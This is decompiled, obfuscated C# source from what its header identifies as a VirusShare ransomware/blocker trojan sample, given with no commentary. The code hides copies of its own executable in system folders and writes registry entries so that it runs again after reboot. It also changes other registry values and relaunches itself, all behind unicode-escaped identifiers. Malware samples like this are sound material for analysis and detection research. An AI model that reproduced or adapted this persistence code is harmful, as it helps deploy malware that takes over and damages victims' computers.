// Decompiled with JetBrains decompiler
// Type: .
// Assembly: System, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BCD7F698-81A9-45B6-B776-A5010DB561F8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-fa05b3c64ba6163bb64b30062883b6f46b0f1c15f6c74963ec9341db78f63ddb.exe

using \u0001\u000E\u0003\u0004;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace \u0001\u000E\u0003\u0004
{
  internal class \u0005\u000C\u000F : \u000B\u000D
  {
    private static Mutex \u000D\u0010;

    public static void \u0001\u000B\u0004()
    {
      \u0005\u000C\u000F.\u000F\u000C\u0004\u0009\u0006();
      \u0005\u000C\u000F.\u000A\u0005\u0007\u0007\u000D\u000C();
      \u0005\u000C\u000F.\u0009\u0003\u0006\u000C\u000D();
      \u000B\u000D.\u0005\u000F();
    }

    private static void \u0009\u0003\u0006\u000C\u000D()
    {
      RegistryKey registryKey;
      if (\u000B\u0005\u0006\u000D\u0002\u0008.\u0011\u0002\u000C)
      {
        \u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u0006\u0006[0] = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0003\u0005() + \u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u0006\u0006[0];
        \u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u0006\u0006[1] = Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) + \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0003\u0005() + \u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u0006\u0006[1];
        registryKey = Registry.LocalMachine;
      }
      else
      {
        \u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u0006\u0006[0] = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0003\u0005() + \u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u0006\u0006[0];
        \u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u0006\u0006[1] = Environment.GetEnvironmentVariable(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0005\u0003()) + \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0003\u0005() + \u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u0006\u0006[1];
        registryKey = Registry.CurrentUser;
      }
      if (\u0005\u000C\u000F.\u0005\u0010\u0001\u0008())
        return;
      try
      {
        foreach (string str in \u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u0006\u0006)
        {
          if (!\u000C\u000E.\u0024MD\u002422(str))
          {
            File.Copy(\u000B\u0005\u0006\u000D\u0002\u0008.\u000D\u0007\u0010\u0011\u000D\u0008, str);
            File.SetAttributes(str, FileAttributes.Hidden);
          }
        }
      }
      catch
      {
      }
      try
      {
        if (registryKey.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0001\u0009\u0001()) == null)
          registryKey.CreateSubKey(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0001\u0009\u0001());
        if (registryKey.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0007\u0008\u0011\u0011()) == null)
          registryKey.CreateSubKey(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0007\u0008\u0011\u0011());
        registryKey.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0001\u0009\u0001(), true).SetValue(\u000B\u0005\u0006\u000D\u0002\u0008.\u0009\u000E\u0005\u000F\u000D\u0005[0], (object) \u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u0006\u0006[0]);
        registryKey.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0007\u0008\u0011\u0011(), true).SetValue(\u000B\u0005\u0006\u000D\u0002\u0008.\u0009\u000E\u0005\u000F\u000D\u0005[1], (object) \u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u0006\u0006[1]);
      }
      catch
      {
      }
      try
      {
        \u0005\u000C\u000F.\u000D\u0010.Close();
        foreach (string fileName in \u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u0006\u0006)
          Process.Start(fileName, string.Empty);
      }
      catch
      {
      }
      Environment.Exit(0);
    }

    public static void \u0007\u000C\u0005\u0002\u0007(string _param0)
    {
      try
      {
        \u0005\u000C\u000F.\u000D\u0010.Close();
      }
      catch
      {
      }
      \u000C\u000E.\u000B\u0006\u000D\u000F(_param0);
      \u0005\u000C\u000F.\u0007\u0001();
    }

    private static void \u0007\u0001()
    {
      \u000B\u000D.\u0006\u000F();
      RegistryKey registryKey = !\u000B\u0005\u0006\u000D\u0002\u0008.\u0011\u0002\u000C ? Registry.CurrentUser : Registry.LocalMachine;
      try
      {
        registryKey.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0001\u0009\u0001(), true).DeleteValue(\u000B\u0005\u0006\u000D\u0002\u0008.\u0009\u000E\u0005\u000F\u000D\u0005[0]);
        registryKey.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0007\u0008\u0011\u0011(), true).DeleteValue(\u000B\u0005\u0006\u000D\u0002\u0008.\u0009\u000E\u0005\u000F\u000D\u0005[1]);
      }
      catch
      {
      }
      try
      {
        foreach (string path in \u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u0006\u0006)
          File.Delete(path);
      }
      catch
      {
      }
      Environment.Exit(0);
    }

    private static bool \u0005\u0010\u0001\u0008()
    {
      foreach (string str in \u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u0006\u0006)
      {
        if (!\u000C\u000E.\u0024MD\u002422(str))
          return false;
      }
      return true;
    }

    private static void \u000A\u0005\u0007\u0007\u000D\u000C()
    {
      RegistryKey registryKey = !\u000B\u0005\u0006\u000D\u0002\u0008.\u0011\u0002\u000C ? Registry.CurrentUser : Registry.LocalMachine;
      try
      {
        registryKey.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000F\u000F\u000F\u000A(), true).SetValue(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0005\u0001\u0011\u000F\u000C(), (object) \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0008\u0001(), RegistryValueKind.DWord);
        registryKey.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000F\u000F\u000F\u000A(), true).SetValue(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0005\u000D\u0010\u0001\u000A(), (object) \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0002\u000D\u000F\u0005\u0005(), RegistryValueKind.DWord);
        registryKey.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0011\u0009(), true).SetValue(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0009\u0001\u000F\u0003\u0002(), (object) \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0002\u000D\u000F\u0005\u0005(), RegistryValueKind.DWord);
      }
      catch
      {
      }
    }

    private static void \u000F\u000C\u0004\u0009\u0006()
    {
      try
      {
        \u0005\u000C\u000F.\u000D\u0010 = new Mutex(true, \u000B\u0005\u0006\u000D\u0002\u0008.\u0010\u0011\u0011);
        \u0005\u000C\u000F.\u000D\u0010.ReleaseMutex();
      }
      catch
      {
        Environment.Exit(0);
      }
    }
  }
}
